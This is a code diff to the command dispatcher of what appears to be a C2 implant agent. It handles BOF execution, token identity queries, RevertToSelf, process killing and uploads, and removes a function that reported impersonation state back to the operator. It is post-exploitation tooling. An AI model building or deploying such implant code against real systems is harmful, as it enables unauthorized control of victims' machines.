@@ -44,10 +44,7 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 			this->CmdDownloadState(CommandId, inPacker, outPacker); break;
 
 		case COMMAND_EXEC_BOF:
-			this->CmdExecBof(CommandId, inPacker, outPacker); 
-			if (bofImpersonate != 1)
-				this->AlertImpersonated(outPacker);
-			break;
+			this->CmdExecBof(CommandId, inPacker, outPacker);  break;
 
 		case COMMAND_GETUID:
 			this->CmdGetUid(CommandId, inPacker, outPacker); break;
@@ -328,7 +325,6 @@ void Commander::CmdExecBof(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	outPacker->Pack32(commandId);
 
 	bofPacker->Clear(TRUE);
-
 }
 
 void Commander::CmdGetUid(ULONG commandId, Packer* inPacker, Packer* outPacker)
@@ -350,7 +346,6 @@ void Commander::CmdGetUid(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		result = TokenToUser(TokenHandle, username, &usernameSize, domain, &domainSize, &elevated);
 
 	if (result) {
-		outPacker->Pack8(FALSE);
 		outPacker->Pack8(elevated);
 		outPacker->PackStringA(domain);
 		outPacker->PackStringA(username);
@@ -719,8 +714,6 @@ void Commander::CmdRev2Self(ULONG commandId, Packer* inPacker, Packer* outPacker
 	outPacker->Pack32(commandId);
 
 	ApiWin->RevertToSelf();
-
-	outPacker->Pack8(TRUE);
 }
 
 void Commander::CmdPsKill(ULONG commandId, Packer* inPacker, Packer* outPacker)
@@ -974,46 +967,6 @@ void Commander::CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker)
 }
 
 
-
-void Commander::AlertImpersonated(Packer* outPacker)
-{
-	if (bofImpersonate == 1)
-		return;
-
-	if (bofImpersonate == 2) {
-
-		BOOL  result = FALSE;
-		BOOL  elevated = FALSE;
-		CHAR* username = (CHAR*)MemAllocLocal(512);
-		ULONG usernameSize = 512;
-		CHAR* domain = (CHAR*)MemAllocLocal(512);
-		ULONG domainSize = 512;
-
-		HANDLE TokenHandle = TokenCurrentHandle();
-		if (TokenHandle)
-			result = TokenToUser(TokenHandle, username, &usernameSize, domain, &domainSize, &elevated);
-
-		if (result) {
-			outPacker->Pack32(0);
-
-			outPacker->Pack32(COMMAND_GETUID);
-
-			outPacker->Pack8(TRUE);
-			outPacker->Pack8(elevated);
-			outPacker->PackStringA(domain);
-			outPacker->PackStringA(username);
-		}
-
-		MemFreeLocal((LPVOID*)&username, 512);
-		MemFreeLocal((LPVOID*)&domain, 512);
-	} 
-	else {
-		outPacker->Pack32(0);
-		outPacker->Pack32(COMMAND_REV2SELF);
-		outPacker->Pack8(TRUE);
-	}
-	bofImpersonate = 1;
-}
 
 void Commander::CmdSaveMemory(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
